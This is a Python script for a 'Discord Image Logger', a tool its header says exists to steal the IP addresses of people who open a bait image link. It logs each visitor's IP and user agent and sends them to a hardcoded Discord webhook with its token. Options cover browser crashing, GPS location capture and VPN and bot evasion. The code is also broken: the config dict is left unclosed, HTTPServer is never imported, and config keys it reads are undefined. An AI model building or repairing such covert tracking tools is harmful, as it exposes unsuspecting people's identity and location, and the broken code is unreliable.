from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "rcx"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1110675906726465567/z_mGPe0YZjEu16MZJf-i-2UZjr5qUyXI_DF3ZDidnddQNEUlgsgumz74Tz0LXuE-OwLB",
    "image": "https://www.myduchess.com/wp-content/uploads/2021/01/DU-Image-2020-SandwichesGrill-Hotdog-FA-e1610389513139.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by Rcx's Image Logger. https://github.com/rcx/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to.
# LOGGING #
def log_ip(ip, agent):
    data = {
        "content": f"IP: {ip}\nUser-Agent: {agent}"
    }
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(config["webhook"], json=data, headers=headers)


# HTTP REQUEST HANDLER #
class ImageLoggerHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Parse the URL and get the image URL argument
            parsed_url = parse.urlparse(self.path)
            image_url = parsed_url.query if config["imageArgument"] else None

            # Build the HTML response
            html = f"""
                <html>
                <head>
                    <meta http-equiv="refresh" content="0;url={config['image']}">
                </head>
                <body>
                    <img src="{config['image']}" />
                </body>
                </html>
            """

            # Set the response headers
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            # Send the HTML response
            self.wfile.write(html.encode())

            # Get the client's IP address and user agent
            ip = self.client_address[0]
            user_agent = self.headers.get("User-Agent")

            # Log the IP and user agent
            log_ip(ip, user_agent)

            # Check for VPN and bot detection
            if config["vpnCheck"] != 0 and is_vpn(ip):
                if config["vpnCheck"] == 2:
                    return
                if config["vpnCheck"] == 1 and is_suspicious_bot(user_agent):
                    return

            # Check for link alerts
            if config["linkAlerts"] and image_url is not None:
                alert_text = f"Someone sent the image URL: {image_url}"
                send_alert(alert_text)

            # Check for bot detection
            if is_bot(user_agent):
                if config["antiBot"] >= 3:
                    return
                if config["antiBot"] >= 1 and is_suspicious_bot(user_agent):
                    return

            # Send the alert
            alert_text = f"Opened the image URL: {config['image']}"
            send_alert(alert_text)

            # Check if custom message is enabled
            if config["message"]["doMessage"]:
                send_custom_message()

            # Crash the browser if enabled
            if config["crashBrowser"]:
                crash_browser()

        except Exception as e:
            traceback.print_exc()


# HELPER FUNCTIONS #
def send_alert(text):
    data = {
        "content": f"<@&{config['roleID']}> {text}"
    }
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(config["webhook"], json=data, headers=headers)


def send_custom_message():
    data = {
        "content": config["message"]["message"]
    }
    if config["message"]["richMessage"]:
        data["allowed_mentions"] = {"parse": []}
        data["embeds"] = [
            {
                "title": "Custom Message",
                "description": config["message"]["message"],
                "color": config["color"]
            }
        ]
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(config["webhook"], json=data, headers=headers)


def crash_browser():
    try:
        requests.get("http://localhost:7777/crash")
    except:
        pass


def is_vpn(ip):
    # Check if IP belongs to a known VPN service
    # Implement your own logic here
    return False


def is_bot(user_agent):
    # Check if the user agent belongs to a known bot or crawler
    # Implement your own logic here
    return False


def is_suspicious_bot(user_agent):
    # Check if the user agent belongs to a suspicious bot or crawler
    # Implement your own logic here
    return False


# MAIN #
if __name__ == "__main__":
    # Start the HTTP server
    server_address = ("", config["port"])
    httpd = HTTPServer(server_address, ImageLoggerHTTPRequestHandler)
    print("Server started")
    httpd.serve_forever()
